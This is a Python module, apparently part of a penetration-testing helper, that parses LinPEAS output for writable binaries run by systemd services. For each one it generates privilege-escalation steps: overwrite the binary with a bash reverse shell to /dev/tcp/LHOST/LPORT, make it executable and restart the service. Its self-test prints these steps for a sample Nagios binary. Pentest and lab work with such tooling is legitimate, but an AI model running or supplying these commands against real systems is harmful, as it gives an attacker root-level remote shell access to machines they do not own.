"""Detect writable binaries pointed to by systemd service files from LinPEAS output."""

import re
from typing import Dict, List

# LinPEAS format:
#   /lib/systemd/system/foo.service is calling this writable executable: /usr/local/bin/foo
_WRITABLE_BIN_RE = re.compile(
    r"(?:(\S+\.(?:service|timer))\s+)?is calling this writable executable:\s+(\S+)",
    re.IGNORECASE,
)


def parse_service_binary_section(section_text: str) -> List[Dict]:
    """Extract writable binary paths from systemd service file analysis."""
    results: List[Dict] = []
    seen: set = set()
    for m in _WRITABLE_BIN_RE.finditer(section_text):
        service = m.group(1) or ""
        binary_path = m.group(2)
        if binary_path not in seen:
            seen.add(binary_path)
            results.append({"service": service, "binary_path": binary_path})
    return results


def generate_commands(binary_path: str) -> List[str]:
    """Generate exploit steps for a writable service binary."""
    bname = binary_path.split("/")[-1]
    return [
        f"cp {binary_path} /tmp/{bname}.bak  # backup original",
        f"echo '#!/bin/bash' > {binary_path}",
        f"echo 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' >> {binary_path}",
        f"chmod +x {binary_path}",
        "# Restart the service (check sudo -l for restart command):",
        "sudo systemctl restart <service-name>",
        "# Or wait for the service to restart automatically",
    ]


def analyze(section_text: str) -> List[Dict]:
    """Analyze LinPEAS output for writable systemd service binaries.

    Returns a HIGH finding for each writable binary called by a service.
    """
    findings: List[Dict] = []
    for entry in parse_service_binary_section(section_text):
        binary_path = entry["binary_path"]
        findings.append({
            "binary_path": binary_path,
            "service": entry["service"],
            "severity": "HIGH",
            "type": "service_binary",
            "description": "writable binary called by a systemd service",
            "commands": generate_commands(binary_path),
        })
    return findings


# ── CLI self-test ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    SAMPLE = """
/lib/systemd/system/nagios.service is calling this writable executable: /usr/local/nagios/bin/npcd
"""
    print("=== analyze ===")
    for f in analyze(SAMPLE):
        print(f"[{f['severity']}] {f['type']} -> {f['binary_path']}  ({f['description']})")
        for cmd in f["commands"][:3]:
            print(f"  $ {cmd}")
